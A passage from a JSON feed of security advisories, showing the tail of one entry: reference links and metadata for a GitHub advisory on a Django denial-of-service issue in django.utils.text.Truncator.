href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HJFRPUHDYJHBH3KYHSPGULQM4JN7BMSU/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HJFRPUHDYJHBH3KYHSPGULQM4JN7BMSU/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h8gc-pgj2-vjm3\">https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h8gc-pgj2-vjm3",
            "title": "[django] Django Denial-of-service in django.utils.text.Truncator",
            "date_modified": "2023-11-12T05:04:18.000Z",
            "date_published": "2023-11-03T06:36:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h8gc-pgj2-vjm3"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}